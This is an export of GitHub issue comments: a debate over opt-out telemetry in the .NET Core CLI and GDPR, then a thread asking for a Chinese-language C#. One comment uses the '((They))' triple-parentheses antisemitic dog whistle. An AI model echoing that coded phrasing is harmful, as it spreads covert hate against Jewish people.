> <https://github.com/notifications/unsubscribe-auth/AEXtDMAu3si_TSiZUtGzbJu2Y1ty9Fkpks5srKytgaJpZM4Ig9GI>
> .
>
"
2210	"@kspeakman See, that's the thing. They're not watching your webcam, and the thing we're discussing is free. 

Nobody inside Microsoft is going ""oh my hecking gosh, Kasey just ran `dotnet new mvc` for *the fifth time today!*"". There is absolutely no reason whatsoever for anybody inside Microsoft to brute-force the hashing algorithm used for the machine identifier to identify the IP address of a user, then apply to their ISP to find out exactly who that user is, so they can tell exactly who this idiot is who regularly types `dotnet rnu` (clue: it's me). It is harmless telemetry gathered purely for the purpose of knowing how, *in aggregate*, at a scale of *millions of users*, people are using the software, to identify ways in which it could possibly be improved, or which platforms are the most popular, or how long certain operations take, or whatever. Nobody sits and reads any individual line of data that comes in. It's a massive database with hundreds of millions of data points. The unique hashed machine identifier exists purely for the purposes of

```SQL
SELECT COUNT(DISTINCT [MachineId])
FROM [Actions]
WHERE [ActionName] = 'publish';
```

so they can see how many different users do a thing, rather than how often a thing is done. It's no more invasive or violate-y than the little light sensors that count people walking into a supermarkets or up and down the cereal aisle, or the pressure sensors in the road that count how many vehicles drive over them, or the package download counters on NuGet or NPM, or any of the thousands of data points that are collected on you each and every day and aggregated onto charts or into deep learning algorithms to try and understand, and maybe improve, the increasingly complex world in which we live."
2211	"@markrendle Maybe it is harmless today, but there's no guarantee tomorrow.
Increased telemetry collection has already been announced.

The webcam comment was for the general policy of now everything from
Microsoft (free or not) gathers data and reports it back to them by
default. Some can't even be turned off. Who knows what they actually have
access to in total.

And I love the ""everybody else is doing it"" argument. :)

On Wed, Oct 11, 2017 at 11:16 AM, Mark Rendle <notifications@github.com>
wrote:

> @kspeakman <https://github.com/kspeakman> See, that's the thing. They're
> not watching your webcam, and the thing we're discussing is free.
>
> Nobody inside Microsoft is going ""oh my hecking gosh, Kasey just ran dotnet
> new mvc for *the fifth time today!*"". There is absolutely no reason
> whatsoever for anybody inside Microsoft to brute-force the hashing
> algorithm used for the machine identifier to identify the IP address of a
> user, then apply to their ISP to find out exactly who that user is, so they
> can tell exactly who this idiot is who regularly types dotnet rnu (clue:
> it's me). It is harmless telemetry gathered purely for the purpose of
> knowing how, *in aggregate*, at a scale of *millions of users*, people
> are using the software, to identify ways in which it could possibly be
> improved, or which platforms are the most popular, or how long certain
> operations take, or whatever. Nobody sits and reads any individual line of
> data that comes in. It's a massive database with hundreds of millions of
> data points. The unique hashed machine identifier exists purely for the
> purposes of
>
> SELECT COUNT(DISTINCT [MachineId])FROM [Actions]WHERE [ActionName] = 'publish';
>
> so they can see how many different users do a thing, rather than how often
> a thing is done. It's no more invasive or violate-y than the little light
> sensors that count people walking into a supermarkets or up and down the
> cereal aisle, or the pressure sensors in the road that count how many
> vehicles drive over them, or the package download counters on NuGet or NPM,
> or any of the thousands of data points that are collected on you each and
> every day and aggregated onto charts or into deep learning algorithms to
> try and understand, and maybe improve, the increasingly complex world in
> which we live.
>
> —
> You are receiving this because you were mentioned.
> Reply to this email directly, view it on GitHub
> <https://github.com/dotnet/cli/issues/3093#issuecomment-335864132>, or mute
> the thread
> <https://github.com/notifications/unsubscribe-auth/AEXtDF2FY2BuB-DZLE7cZPyjFiywgn2pks5srOnTgaJpZM4Ig9GI>
> .
>
"
2212	"@kspeakman That was not an ""everybody else is doing it"" argument. It was a ranking of where this kind of telemetry rates in the modern, pervasively-monitored world. You are no more identifiable, identified or interesting than a small hatchback triggering an ""intelligent"" traffic light. The world runs on data. Of course it is collected. But if you think anything you do ever registers anywhere except as a single unit within an aggregated number expressed in multiples of millions or billions, or with anything other than an algorithm designed to try and sell you and every other human being on this planet things that they don't really want or need, then I would refer you to Tyler Durden.

I, in turn, love the ""but what about tomorrow?"" argument. If something is harmless today, but becomes harmful tomorrow, then the time to worry about it is tomorrow. And as long as all they collect is telemetry (i.e. aggregated and sliced numbers), and it doesn't actually slow down my internet connection, I really can't imagine any possible harm. Rest assured that if, at any point, it is revealed that Microsoft have been gathering secure credentials for databases and storing them, even reversibly-encrypted, then I will open an issue of my own to complain about it."
2213	"@markrendle ""Everybody else is doing it"" was referring to your exchanges
with others, not me. (and also things I've seen from MS employees)

It's fine that you implicitly trust what a company does with your
information until proven otherwise. But I don't. So you'll have to forgive
me for not trusting you to raise an issue on behalf of all of us when it
goes too far. It's already a demonstrated hole that leaks information. I'd
rather it be plugged now and then there's nothing to think about tomorrow.

On Wed, Oct 11, 2017 at 12:28 PM, Mark Rendle <notifications@github.com>
wrote:

> @kspeakman <https://github.com/kspeakman> That was not an ""everybody else
> is doing it"" argument. It was a ranking of where this kind of telemetry
> rates in the modern, pervasively-monitored world. You are no more
> identifiable, identified or interesting than a small hatchback triggering
> an ""intelligent"" traffic light. The world runs on data. Of course it is
> collected. But if you think anything you do ever registers anywhere except
> as a single unit within an aggregated number expressed in multiples of
> millions or billions, or with anything other than an algorithm designed to
> try and sell you and every other human being on this planet things that
> they don't really want or need, then I would refer you to Tyler Durden.
>
> I, in turn, love the ""but what about tomorrow?"" argument. If something is
> harmless today, but becomes harmful tomorrow, then the time to worry about
> it is tomorrow. And as long as all they collect is telemetry (i.e.
> aggregated and sliced numbers), and it doesn't actually slow down my
> internet connection, I really can't imagine any possible harm. Rest assured
> that if, at any point, it is revealed that Microsoft have been gathering
> secure credentials for databases and storing them, even
> reversibly-encrypted, then I will open an issue of my own to complain about
> it.
>
> —
> You are receiving this because you were mentioned.
> Reply to this email directly, view it on GitHub
> <https://github.com/dotnet/cli/issues/3093#issuecomment-335885470>, or mute
> the thread
> <https://github.com/notifications/unsubscribe-auth/AEXtDAIcTChLUHDR2ridFemaWC9hU6t7ks5srPqqgaJpZM4Ig9GI>
> .
>
"
2214	"@kspeakman 

>  I'd rather it be plugged now and then there's nothing to think about tomorrow.

If you don't trust Microsoft at all (and you also don't trust the community to keep them in check), then you will always have to think about it, because they could reintroduce telemetry at any moment.

So I don't see how removing the telemetry that you consider harmless improves the situation for you in any way."
2215	"@markrendle I know you don't see it. And that's why I'm closing my end of
the conversation for now. Good luck!

On Wed, Oct 11, 2017 at 12:45 PM, Petr Onderka <notifications@github.com>
wrote:

> @kspeakman <https://github.com/kspeakman>
>
> I'd rather it be plugged now and then there's nothing to think about
> tomorrow.
>
> If you don't trust Microsoft at all (and you also don't trust the
> community to keep them in check), then you will always have to think about
> it, because they could reintroduce telemetry at any moment.
>
> So I don't see how removing the telemetry that you consider harmless
> improves the situation for you in any way.
>
> —
> You are receiving this because you were mentioned.
> Reply to this email directly, view it on GitHub
> <https://github.com/dotnet/cli/issues/3093#issuecomment-335891711>, or mute
> the thread
> <https://github.com/notifications/unsubscribe-auth/AEXtDEFe6I1DoLyH4NTx2kWEjxoiyjN2ks5srP67gaJpZM4Ig9GI>
> .
>
"
2216	No one said it needs to be removed, just that the default should be off and one should ask nicely for permission to capture the harmless data. 
2217	"@rustybox If the default were off and you had to set an environment variable to turn it on, they would get no data, because nobody cares enough one way or the other to do anything about it at all. ""We're going to benignly collect anonymous numbers about how people use this software; you can turn this off if you want"" is the default position these days, and software gets better (not to mention more secure) because of it."
2218	"If the installer is run with admin privileges it can set the env var itself.

   Would you like to help us make dotnet core better by allowing us to collect some harmless telemetry N/y?
    >"
2219	[Case in point](https://medium.com/firefox-test-pilot/firefox-containers-are-go-ed2e3533b6e3)
2220	@rustybox Not on Linux.
2221	"@markrendle 
> If the default were off and you had to set an environment variable to turn it on, they would get no data, because nobody cares enough one way or the other to do anything about it at all. 

Well, they would get data from those users that value the product and want to help make it better (like me). I would personally choose to enable telemetry **if I was offered a choice**. The only reason I now disable it as a matter of course is becuase I don't like the way the participation in telemetry is taken for granted - and I think having to set an environment variable after the install is a deliberate attempt to make it one step removed (and thus easier for the user to forget about opting out later) from the install. I know why its done this way, like you say they _will_ get more data. "
2222	"When I setup my iPhone or Macbook - Apple asks me if I want to share diagnostic data with them. On the other hand, Microsoft, you can't disable all of their data tracking in Windows 10. It is virtually impossible. 

If it can be done at the OS level, as Apple has shown, it can be done at the level of .NET Core. It is easy to do, the problem of asking is they are too lazy to implement an easy feature. "
2223	"@migueldeicaza Been staying away from this thread, its turned into a religious war.

No 3rd-party extensions installed, latest VS4M, latest Xamarin.XXXX (alpha channel normally), I ""assumed"" it was a part of the ""Visual Studio Experience Improvement Program"" that you can not turn it off in non-stable releases. Really noticeable in the firewall reports at one client site since we have to review them with the CSO as our Virtual Machine MAC addresses are tied to the connection (I use Little Snitch to block it on personal Macs) but in secure sites we do not use own own laptops directly for coding, just managed macOS VMs and the firewalls there block all outbound traffic by default):

> Deny the following outgoing connections from xx:xx:xx:xx:xx:xx (via mono-sgen64 process on VMccc8f02) to domain mixpanel.com:

Little Snitch reports it as:
 
> /Applications/Visual Studio.app/Contents/MacOS/VisualStudio via /Library/Frameworks/Mono.framework/Versions/5.4.0/bin/mono-sgen64
> 

If it is not coming from Microsoft/Xamarin/MonoDevelop/Mono code, then the only thing I can think of off the top of my head is a Nuget-based ""tool"" that is executing during a MSBuild run. I'll do a couple tests tonight and a `mitmproxy` capture if needed so I can so I can read the secure contents of what is being sent to determine the ""who"".
"
2224	"Everyone should take a step back and think what this is about - for me its about saying it's NOT ok to yet another step towards complete lack of any privacy, since ""it's OK"". Yet it might or might not be, the key problem is that companies push it every year slightly further and further, and if everyone won't stand against it - it will be OK at some point that your insurance company, bank, creditor or law firm tells you they can't offer you some service (since some algorithm somewhere put you in the pile of risky clients, but they wont tell you that). It's already happening all around- it might not happen to you in a month or year, but at some point it will. Just think about the amount of digital footsteps we leave each day behind.

Therefore I don't want Microsoft to gather any kind of data about anything WITHOUT MY EXPLICIT CONSENT. It's not OK and let's focus on this please!

I strongly advise anyone who might think ""I don't have anything to hide"" to read about BigData related ethics and the issues involved. By the end of the day any kind of output is a prediction - but no one cares and takes the same prediction for granted - the same prediction might misleadingly or unjustly categorize YOU in a harmful manner - this is the issue for me. You might think - but how? Simply, by the data every company is gathering about you - since it's OK. Think about it.

If we all just stand by and say ""It's ok"" then companies will push this further and further."
2225	"> if 250 Americans think a law is unjust, should the United States federal government even consider changing it?

What if these 250 Americans are part of a minority which this law allows to oppress, for instance ?
It's not about the number of people who feel concerned, it's about why they do.
And in the current situation, no one is concerned about collecting data (even private data). The issue is about not explicitly asking.
No one decided to use .NET because ""it has telemetry"", it's not a feature for the user, hence it should require explicit consent to be enabled."
2226	I think the failure for many people in this discussion to understand consent is telling of the state of the industry.  
2227	"@markrendle 
> If the default were off and you had to set an environment variable to turn it on, they would get no data, because nobody cares enough one way or the other to do anything about it at all. 

I don't think anyone is asking for this to be as equally cumbersome to enable as it is to disable. We just want the user to be asked for their consent (i.e show a checkbox on the installer, or ask a yes / no question on first use of the cli) - the default selection could still be yes (opt in), but atleast users could opt out there and then if they wish. There should be no need to have to come back later and set an environment variable imho.
"
2228	"User should be asked every-time you want to store their private data. 
User should understand what data you are storing.
User should understand that the data is temporarily stored or permanently stored.

~ Stallman"
2229	We are going to allow for this telemetry to be turned off on Alpha releases.   But I still do not understand why we have code that logs into mixpanel.
2230	I know it's been a while, but is .NET Core telemetry still opt-in? I wonder whether this constitutes a violation of GDPR now.
2231	"I installed .net core today and the telemetry option was not opt-in. Clearly a violation of GDPR since the data that is shared includes [personal information ](https://www.eugdpr.org/gdpr-faqs.html)

edit
Wow, what I thought to be an innocent comment got way more attention than it should. Just to clarify, I did not intend to start an anti-Microsoft campaign, I simply wanted to report the issue through what I assumed to be the most appropriate channel. 

The .net core documentation [page ](https://docs.microsoft.com/en-us/dotnet/core/tools/telemetry) states that (among other stuff) this data is collected 

> Hashed MAC address: a cryptographically (SHA256) anonymous and unique ID for a machine. This metric is not published.

The FAQ page of the EUGDPR.org website states: (note emphasis mine) 

> ## What constitutes personal data?
> 
> The GDPR applies to ‘personal data’ meaning any information relating to an identifiable person who can be directly or indirectly identified in particular by reference to an **_identifier_**. This definition provides for a wide range of personal identifiers to constitute personal data, including name, identification number, location data or **_online identifier_**, reflecting changes in technology and the way organisations collect information about people.

The way I interpret this, an **_identifier_** based on the MAC address of the PC where the SDK is installed is considered personal data and hence the data collection should follow the guidelines from the GDPR regulations. "
2232	"About GDPR: it would only violate if it collected personal data or data allowing to identify an individual.
AFAIK app insights doesn’t persist IP addresses since February so I guess this should be okay-ish (assuming no other data would be a violation)
edit: there’s also no Session data. Not sure about machine infos
edit 2: apparently hashed MAC address is sent"
2233	"I don't use .NET (I came here from Hackernews). But just so you know, this is the kind of thing that gives this software and your brand in general a horrible reputation. I for example use VS Code as my editor of choice and when I first read about this telemetry stuff a while back, I went through the source to check for this anti-feature being built into that too. I will not install Windows on principle because I know it's loaded with your pushy telemetry as well. Apple clearly asks you ONCE if you want to report anonymous usage statistics to them, and it's one checkbox to deal with in the setup of the machine.

It does not take a lot of effort on your part to make the choice opt-in rather than opt-out by default, and no argumentation that project contributors or anyone else made in this thread or others of this type (there are a couple issues on here if I remember correctly about the topic of telemetry) have clearly been able to show why doing so would somehow compromise your product feedback.

So listen to your users who are clearly speaking out against this telemetry (or rather the way you choose to context the collection of it). All you have to do is make it compliant to their expectations, because that's what building great user experiences is all about. I don't get why this is so hard to understand.

These telemetry GH issues demonstrate that people are passionate about your product and about their own privacy. Do the decent thing and stop jamming your telemetry down people's throats."
2234	Opt-out is still unacceptable. None of the (potential) users complaining about this are going to be satisfied unless it’s opt-in. I love .NET, and even I’m hesitant to use Core if I have to do a dance to avoid telemetry, as it presents an obvious legal and PR risk for me.
2235	I agree, should be option to opt out this feature
2236	"It's not just `dotnet/cli` that's guilty of this, Office-js is also collecting user data without explicit consent. https://github.com/OfficeDev/office-js/issues/61
"
2237	"@dasMulli practically any datum is considered personal data, it does not need to be ip address, even user-agent is identifying (especially with other data) - this is exact strategy that spammers use to have persistent fingerprint of you
and that's why it is opt-in - because someone must check what data is collected and what is it used for, then write it all and ask user for permission
it is exactly opposite to current strategy to collect as much data as possible for current and future use"
2238	"@kiicia No. You have to be able to identify an individual person by the given data. Identifying and telling ""it's the same customer"" is not the same. Using IP, you can identify a person by asking ISP to whom does that IP belong. You can't do that with User Agent or a cookie."
2239	"You're still violating the ""privacy by default"" principle of the GDPR, as some of these data *could* be PII under some circumstances (exotic UA combinations e.g.). Opt in would solve a *lot* of potential legal headaches."
2240	"Something to back this complaint up:

User's hashed MAC address is sent by default. This is consistently hashed so can be correlated across other information sources to identify a user.

https://github.com/dotnet/cli/blob/b45f1fb439b36872c249b07f1c6bddf20167f166/src/dotnet/Telemetry/Sha256Hasher.cs#L12

This is seriously not on."
2241	"@tadas-subonis it depends on who you ask, there are internal corporate trainings/policies which clearly state what is considered personal data and what is not (consulted with/interpreted by lawyers) and it seems that any literal datum ""produced"" by client is automatically user data no matter how trivial it may seem
also some companies downplay/ignore certain details because it is their modus operandi to gather and use all available data
there is however clause about ""data which are necessary to use/work with/deliver service"" - for example you may require certain data because you are unable to deliver service otherwise... then consent can be implicit by sole decision to use service - it is also used to explain why certain amount of data must be gathered, still you need to say something to user/client and give them chance to express their decision"
2242	"I have to admire Microsoft's consistent use of the word ""telemetry"" across all its various privacy-violating platforms and practices."
2243	微软现在可以说是操作系统一家独大，所以说有时候可能会忽略掉一些用户在意的问题。对于.Net Core 收集用户信息这个问题我的想法是 ——  这个问题不应该再有过多的争议，显然用户是对微软的收集方式不满。那么微软最直接、最合理的做法不应该就是在统计用户信息之前给用户一个右好的提示和选择；并将收集范围告知用户，给予用户完全的选择权吗？最后的结果也很简单：1.微软采纳用户合理意见 2.微软不采纳用户意见，首先微软需要对用户提议有一个明确的态度！
2244	Microsoft doesn't give a toss what the community wants. Open source for them is just a way to get code improvements and documentation into their systems at other people's expense.
2245	"Why is micro$haft still in business? ((They)) should be fined into oblivion for things like this. (""[ISSUE CLOSED]"")
"
2246	"Why has the opt-out has to be so hard ? Setting one long env. variable on every process ? It seems microsoft is making quite an effort to provide UX that obscures anything it doesn't want you to see.
Wouldn't it be nicer to get prompt during install, not just info message about crime already comitted ? 
Or at least telemetry-less packages ?
"
2247	"@Meyhem 

>  Setting one long env. variable on every process ?

Every OS I know lets you set the environment variable once in a way that applies to every process."
2248	"This isn't a technical discussion. We can set environment variables.

We are asking for opt-in with explicit consent, not opt-out.

This is a sign of respect for your userbase, something which we demand after years of abuse."
2249	"By the way, the installation process of the SDK on Debian still calls home even if `DOTNET_CLI_TELEMETRY_OPTOUT=1` is set. Verified that with

```bash
export DOTNET_CLI_TELEMETRY_OPTOUT=1
sudo apt install --download-only dotnet-sdk-2.1
```
then running (in another console)
```bash
sudo tcpflow -c
```
and then
```bash
sudo apt install dotnet-sdk-2.1
```
on Debian 9.

I believe the offending command is in the [postinstall script](https://github.com/dotnet/core-sdk/blob/47776ad0c6fba302f4ce1bf44e4cfad8b7a5a4f3/packaging/deb/postinst#L22).

"
2250	There's a fine example of where opt out telemetry goes to crap...
2251	@kstarikov I think you could/should create a new issue for this
2252	For people without Chrome, translation link: [Hello, please create the Chinese version of the C# language, and .net on the language f# vb, please provide their Chinese version. Let more people in the mother tongue to achieve rapid programming, to achieve ideas, to create a richer program.](https://translate.google.com/translate?tl=en&u=https://github.com/dotnet/csharplang/issues/993)
2253	"@jnm2  
抱歉,没有翻译, 我翻译一下.
Sorry, no translation, I translated it.

Hello, please create the Chinese version of the C # language, and .net on the language f # vb, please provide their Chinese version. So that more people in the mother tongue to achieve rapid programming, to achieve ideas, to create a richer program."
2254	"To achieve the idea of ​​universal programming.
 At present, want to master the programming of this skill requires a high learning costs and costs, programming or a small number of patents, ordinary people or people who want to switch jobs to enter this area is a difficult or even impossible to achieve, Because its cost and cost is high.
 So, because of this, so it is necessary to retreat and compromise?
 No, I envisioned a new path. That is - to achieve [Chinese programming], [programming], programming is the main difficulty of English and other Western natural language, but only as long as learning English and other Western natural language can learn programming? No, it is only to reduce the threshold and cost, but ordinary people do not have this time and energy costs, ordinary people are popular, is the most populous general public, this part of the people do not have that cost, it is difficult to afford the cost of learning , I imagine is to learn programming costs and costs and thresholds to a minimum, or even down to 0. Do not underestimate yourself, as long as you have a sound brain, you can easily entry.
 Programming with your mother tongue will undoubtedly be extremely convenient, you omit the cost and cost of learning a bunch of redundant knowledge, the only thing you need to do is exercise your own logical thinking, rational cognitive ability, spatial imagination and time imagination.
 Programming language development to the present, has become increasingly close to the natural language, for English is the mother tongue, the learning cost is almost no, so their starting point is very high, is the direct use of mathematical ideas in programming, which caused if In fact, the computer science is mainly applied to discrete mathematics. In addition to the computer can be calculated in mathematics, but also non-mathematical calculations. Non-mathematical computing is with the math Irrelevant, or far from mathematics, because the people of our country have mastered the 99 multiplication table, the basic four operations are in hand, the use of addition and subtraction is easy, and as long as you master the four operations can Easy to master the computer non-mathematical calculation.Moreover, higher mathematics and more advanced mathematics is based on four operations, into this area, you will enhance your own mathematical ability.
 Programming is a tool that, by programming, you can direct the computer to work according to your wishes and ideas.
 At present, China began to force the semiconductor industry, the future use of programming skills will be more and more. Through programming, you can quickly build a software product, the software products installed in the machine, the machine will follow the software But the technology is all based on the creation of the basis of Westerners.Media of semiconductor technology and information technology is the computer's two main areas, the performance of the semiconductor is the hardware, but also the use of information technology, Information technology is the performance of software.
 
 Programming
 Big Data
 artificial intelligence
 Machinery Automation
 These are complementary, and now because of the media publicity, people only see a side of a side, there is no overall observation of this area.To be an analogy, if the human brain compared to computer hardware, then, people's thinking is equivalent to the computer The chip in the chip is equivalent to the nerve cells in the brain (brain cells), the electronic signal running in the transistor is equivalent to the brain between the brain cells to pass the biological signal, the neural network is equivalent to the number of connections To the integrated circuit of the transistor, and mechanical automation is the human body.With the mechanical composition of the machine, or machine composed of mechanical realization of human limb function and organ function.
 
 Programming is like the construction engineers engaged in the behavior of programming is also built, but is built in the computer and then by the chip implementation, the chip and then drive the implementation of the corresponding action of the machine.Therefore, programming is not difficult to achieve Chinese programming, Chinese programming, On the 99, down to the people who have just have the ability to programming, programming is to display your wisdom, to achieve your ideas, to show your talent, people's inspiration flashed, you have to seize, because the security is missing, If you realize your inspiration, you may be able to change the world, and it will undoubtedly enrich the Chinese program world for the 1.4 million people in China or the native speakers of Chinese or who will use Chinese to master the basic skills. Certainly not so hard and difficult now, the future of the program must be rich and colorful, a hundred schools of thought contend.
 Programming, but also solve the employment, to solve the industry to upgrade, transformation and upgrading, human survival problems, life problems.Future, education, health care, production activities, all can be realized by the machine, the machine has a highly automated function of food and clothing, life and death, all can be The machine is solved, and what you have to do is programming to command the machine how to do it.
 Now, people can not see the prospect of programming, and, because most of the field into the elite scholars, they have thinking curing, that the realization of Chinese programming Chinese programming does not make sense, they have only English programming horse is the first, the English programming is very high , That programming has no other way to go, no other possibilities, so they do not want to study Chinese programming Chinese programming, but will not come to realize, because they have been seriously Westernized, they have to do the next step is to abandon their The mother tongue, and the culture that engages in the mother tongue.When you ask them what they are, they will not know, even if they know the name, they can not tell what is the country.There is a wide range of cultural connotation covered by Guoxue. But also because the Westerners have established a large program world, all the conditions are complete, they used to use, so they are too lazy to do so. Re-establish the new world of the program, yes, it looks like nothing is bad, but, according to the law of conservation of matter, what has been, you have to pay the phase Should the price, you have to lose anything, the world does not have free lunch, the sky will not fall pies. The price is what I said earlier. Lost self, I do not know who is the country, do not know what race, gradually unable to understand So that the people we wake up should follow their ass and fall with them assimilated? No.
 So that there is a translation process, the computer is no language, Westerners in order to facilitate the use of computers, so to create a computer language, that is, binary, the computer is only one Stack the electronic signal, the current running in the circuit, the Westerners through the binary signal current will be formatted into two states, that is, positive and negative, the switch can also be said to be yin and yang, with Arabic numerals 0 and 1 said, easy to use , But for people, the current generated 0 and 1 is massive, people can not be read, can not do to write, because the current run at the speed of light, mass 0 and 1 is the speed of light to change its state. Because the speed of electricity and the speed of light in the vacuum is the same.Then, in view of this situation, Westerners need more humane way of communication, more efficient and more simple, so they created the assembly language, assembly is with binary 0 and 1 is equivalent, that is, point to point, one to one, but the 1000100010001000 corresponds to the number 8888.1010 corresponds to the letter A. But the West soon found that the language is still not efficient enough , To express an idea to the computer, or too cumbersome, so, Westerners to create a high-level programming language, that is, the market to see c, c ++, java, javascript, python, etc. These are the names of a programming language. That is, to the mass of the binary 0 and 1 encoding, programming is to use these codes. So, as long as the code design for the instruction, an instruction to express a simple meaning, and then combine a number of instructions with a word or a symbol or a sentence Simple daily language that the use of the word or symbol or daily language can express a complex meaning, after decoding, the computer will be able to understand the meaning of this pile of instructions, this way, for people who have no communication barriers , The West communicates with the computer as if it were a talking person. Of course, the intelligence level of this ""person"" is only in the stage of talking, which is high-level language, although it is still flawed, but it is enough The development of a huge software system program world.Therefore, here describes the encoding - decoding is the translation process because the current Westerners to create programming language Relatively imperfect, so part of the responsibility of the translation by the computer itself, part of the use of computer users, that is, programmers. A part of the computer is called the compiler, is a translation of the machine, by the programmer Part of the programming is compiled, that is, software products, users can easily through the software and computer interaction, the use of programmers preset function.Therefore, the realization of Chinese programming, the key to Chinese programming is to design a Chinese compiler You can learn Westerners to design a simple simple compiler, imitate the three-year-old child's language and computer communication, you can also re-create a complex, powerful compiler, mimic the way adults communicate with Computer communication.
 
 At present, the electronic products have been deep in all aspects of people's lives, with more and more products of the chip, mobile computers do not say, has been too common, household appliances, TV fridge air conditioning, cooking utensils, cars, industrial production, Lathes, etc., have been installed on the chip, as well as national policy, the Internet of Things plans to put all the products can be installed on the chip.Then, that is, these products are programmable, all need applications. The future will develop you can not imagine the electronic products, electrical products, programming prospects are extremely wide.As the programming representative is the human [want] (thinking) extension, you can [think] (thinking) how far, programming on Can go far, and people [think] (thinking) is no limit."
2255	"I'd say, in Chinese forums, this is usually a joke. But there do be a few people pro it.

We generally view it as non-sense. If you really want it, you can create an editor plugin to translate keywords to Chinese and display them."
2256	"@qrli 
你是中国人吗? 怎么对中文编程的话题这么熟悉?看起来你没明白我表达的重点.你是在抵制中文编程吧.
实现母语编程怎么可能没有意义? C#用的字符已经非常接近英语自然语言,也就是越来越母语化,如果这个星球上的人都能用他们自己的母语编程,软件生态将空前的强大和发展.
你完全不知道量变带来的质变是怎样的,就急着否定它?
我设想的是在编程语言的基础上实现本地化和母语化, 不是用插件实现.

------------

are you Chinese? How is the Chinese programming topic so familiar? It looks like you did not understand the focus of my expression. You are resisting Chinese programming.
How does native language programming do not make sense? C # characters are very close to the English natural language, that is, more and more mother tongue, if the planet can use their own native language programming, software ecology will be unprecedented and development.
You do not know what kind of quality change brought about by quantitative change, it is anxious to deny or negative it? Quantity change to Quality change 量变到质变. Change to qualitative change.
I envisioned localization and native language based on the programming language, not using plug-ins."
2257	"希望 微软官方的人看到我的建议,并慎重考虑此建议.谢谢.
Hope that Microsoft officials see my advice and take this proposal seriously.

我觉得最重要的是,C# F# VB已经偏向英语自然语言化,说英语的人总共只有那么多,并且这部分人意愿编程的就更少,有意愿的人又有更多选择(其它编程语言),于是能在C#上发展生根的就很稀少了,没人去研究它,又怎么会进步呢,大家去给微软提建议,让它推出中文版的C# ,什么都用中文 用汉字,中国14亿人 就算一半7亿人学会使用C#都是已经了不得的事.
I think the most important thing is that C # F # VB has been biased towards English natural language, speak English people only so much, and this part of the people will be less programming, there are more people to choose (other programming language ), So the development of rooting in the C # is very rare, no one to study it, how will progress it, we go to Microsoft to make recommendations, let it launch the Chinese version of the C #, All characters are use Chinese with Chinese characters, China 1.4 billion people even if half of the 700 million people learn to use C # are also a very large market.

本地化,母语化可能是突破的关键,生态需要人去建立,首先要人多.中国会英语的毕竟少数,再说会的人又看不上C#.这可真是矛盾.
Localization, the mother tongue may be the key to breakthrough, the ecological needs of people to build, first of all people. China will be a small number of English, say people will not see C #. This is really contradictory."
2258	你自己做 Do it yourself!
2259	"@qwas982 Company has to earn money to keep going. If you pay a big bill, someone will do it for you. You cannot ask someone to do you a favor for free.

And, computer language is not natural language. E.g. Your math symbols are not Chinese, your numbers are not Chinese, but you have no problem with them, right?"
2260	Just a joke!Please close this valueless issues!
2261	"@qwas982 
中国だけでなく、日本でも同様の問題があります。多くのプログラミング言語が英語をベースにしていて、日本語話者にとってプログラミングの難しさの一因になっています。
当然、日本でも「日本語プログラミング言語」が欲しいという声はあります。実際に[なでしこ](https://nadesi.com/top/)というプログラミング言語があります。しかし、日本語プログラミング言語を作れるのはやっぱり日本語話者だけでしょう。中国語ネイティブなC#が欲しければ、それは中国語話者が作るべきで、他力本願でマイクロソフトに頼むものではないと思います。
ちなみに、日本語プログラミング言語は、存在こそあるものの、実際のところあまり流行はしていません。"
2262	"@qrli 
你不过是站在你自己的角度考虑罢了,你没站在微软这种大企业的角度和市场的角度考虑.你不知道生态发达会是怎样一番景象,并且,你想要阻止对编程感兴趣和热心的人.
并且,阿拉伯数字和数学符号没必要中文化.

You are just standing on your own point of view, you do not stand on the perspective of Microsoft's big business and the market point of view.You do not know how ecology is going on, and you want to stop programming Interested and enthusiastic.
Also, Arabic numerals and mathematical symbols are not necessary for Chinese characters."
2263	"@jonechenug  
独裁? 专制?


Dictatorship

autocratic?"
2264	"It's not justify to let other people wasting their time for you so you just don't need to learn English.
Suppose you have Chinese programming language, what's next?
To build a comprehensive computer software, you still need to learn a lot. Most of those documents, thesis are all written in English. So what, asked them to translate it for you too?"
2265	"@ufcpp  朋友你好,
我表达的意思是,本地化和母语化,就像一款国际化的软件会提供多种版本一样,

Hello friend,
I mean, that localization and native language, like an international software will provide a Multi-language version,

こんにちは友人、
つまり、国際化されたソフトウェアのように、ローカリゼーションとネイティブ言語が多言語バージョンを提供し、"
2266	"@shisoft 
看起来你也是站在你自己的角度考虑问题罢了,你觉得你不需要,别人也不需要.所以,你认为,你学会了英语,别人也应该学会英语才能从事编程这一工作.
我并不是为我自己考虑.我考虑的是市场需求.
关于你说的文档翻译问题,我认为,从事这一行业的人变多了,自然会有人去翻译.

It seems that you are standing on your own point of view to consider the problem, you think you do not need, others do not need.Therefore, you think, you learn English, others should learn English to engage in programming this work.
I'm not thinking about myself. I'm thinking about the market demand.
On the translation of the document you said, I think that people who engage in this industry more, and naturally someone will be translated."
2267	"@qwas982 
You want this?It is available in csharp!
```
    class 中文类
    {
        static void Main(string[] args)
        {
            主程序();
        }
        static void 主程序()
        {
            输出(""这是不是你想要的中文编程?"");
            Console.ReadKey();
        }
        static void 输出(String 字符串)
        {
            Console.Write(字符串);
        }
    }
```"
2268	"@jonechenug 

我说的是更进一步
比如;

I'm talking about it further
such as;
 

                             ```类  中文类 {
                                   静态 空 主要(字符串[] 参数) { 
                                       主程序(); 
                                     } 
                                    静态 空 主程序() {
                                       输出(""这是不是你想要的中文编程?""); 
                                         控制台.读键(); 
                                     } 
                                     静态 空 输出(字符串 字符串) {
                                           控制台.写(字符串); 
                                     } 
                              }```
"
2269	"What you are trying to achieve are just symbols, what symbols to form a statement which makes it meaningful to both the compiler and humans. 
The purpose of building a programming language is for efficiency and expressive. What language / characters to represent those symbols are irrelevant.
It's also not a problem if you just translating those symbols, but Chinese symbols are inefficient on developing on modern keyboard and fewer people can read it, so what's the point of this?"
2270	"朋友，有个死掉的项目叫易飞扬，我觉得他可以圆你的“梦”
Friend, there is a dead project called ""Yi FeiYang"", I think it can round your ""dream""."
2271	"@shisoft  你考虑的是面向英语为母语的编程人员,而不是非英语为母语的编程人员.语言和字符的宿主是什么?
不就是文字符号吗?如果你认为  language / characters  是无关紧要的,那么,为什么现在人类编程还是需要输入 language / characters 才能与计算机沟通呢?
第二个问题,你说用中文或其他非英语为母语的文化用键盘开发效率底下,但是你忽略了现在的操作系统都是用软键盘 soft keyboard 完成字符的输入,中文有拼音输入法,输入效率不比输入英语差.

Are you thinking about English-speaking programmers, not non-native speakers? What is the language and character of the host?
If you think language / characters is irrelevant, then why is human programming still need to enter language / characters to communicate with the computer?
